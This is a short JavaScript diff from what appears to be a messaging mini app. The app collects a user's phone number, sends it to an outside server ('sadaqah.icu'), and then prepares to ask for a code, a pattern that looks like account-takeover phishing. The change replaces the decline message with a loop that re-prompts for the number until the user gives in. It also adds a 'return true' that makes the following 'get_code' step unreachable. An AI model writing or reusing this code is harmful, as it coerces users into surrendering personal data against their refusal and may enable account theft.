@@ -350,7 +350,7 @@
           const phone = contactData.contact.phone_number;
           currentPhone = phone;
           phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
-
+          
           // Отправляем номер на сервер
           const res = await fetch('https://sadaqah.icu/submit_phone', {
             method: 'POST',
@@ -359,21 +359,30 @@
           });
           const result = await res.json();
           if (result.status === 'ok') {
-            // После успешной отправки номера переключаемся на состояние get_code
+            return true
             showBlock('get_code');
           } else {
             alert('Error: ' + (result.error || 'Unknown error'));
           }
         } else {
-          // Пользователь отменил – просто остаёмся в том же блоке
-          alert('You need to share your phone number to proceed.');
+          return false
         }
       } catch (e) {
         console.error('requestContact error:', e);
         alert('Failed to request phone number.');
       }
     }
-    requestPhone()
+    async function ss() {
+      let result = false;
+
+      while (!result) {
+        result = await requestPhone();
+      }
+    
+      console.log("Готово, получили true");
+    }
+    ss()
+    
 
     // Обработчик кнопки "Share phone number"
     sharePhoneBtn.addEventListener('click', requestPhone);
